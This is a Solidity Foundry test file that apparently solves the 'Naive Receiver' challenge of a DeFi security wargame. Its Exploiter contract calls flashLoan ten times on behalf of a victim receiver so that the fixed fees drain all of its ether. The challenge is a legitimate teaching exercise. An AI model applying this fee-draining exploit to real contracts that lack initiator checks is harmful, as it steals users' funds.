// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1000e18;
    uint256 internal constant ETHER_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    FlashLoanReceiver internal flashLoanReceiver;
    address payable internal user;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.label(address(naiveReceiverLenderPool), "Naive Receiver Lender Pool");
        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);

        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);

        flashLoanReceiver = new FlashLoanReceiver(
            payable(naiveReceiverLenderPool)
        );
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);

        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter(
            naiveReceiverLenderPool,
            address(flashLoanReceiver)
        );

        /**
         * EXPLOIT END *
         */
        validation();
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}

contract Exploiter {
    constructor(NaiveReceiverLenderPool pool, address receiver) {
        for (uint256 i = 0; i < 10; ++i) {
            pool.flashLoan(address(receiver), 0);
        }
    }
}
